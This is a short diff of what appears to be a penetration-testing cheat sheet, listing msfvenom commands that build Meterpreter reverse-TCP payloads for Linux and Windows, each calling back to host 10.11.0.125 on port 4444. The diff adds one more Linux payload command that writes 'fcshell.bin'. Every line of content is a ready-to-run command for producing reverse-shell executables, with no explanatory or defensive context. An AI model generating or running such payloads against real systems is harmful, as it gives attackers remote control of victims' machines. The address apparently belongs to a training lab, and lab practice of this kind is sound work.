@@ -3,6 +3,8 @@
 **Linux**
 >msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.11.0.125 LPORT=4444 -f elf > shell.elf
 
+>msfvenom -p linux/x86/meterpreter/reverse_tcp --platform linux LHOST=10.11.0.125 LPORT=4444 -f elf -o fcshell.bin
+
 **Windows**
 >msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.125 LPORT=4444 -f exe > shell.exe
 
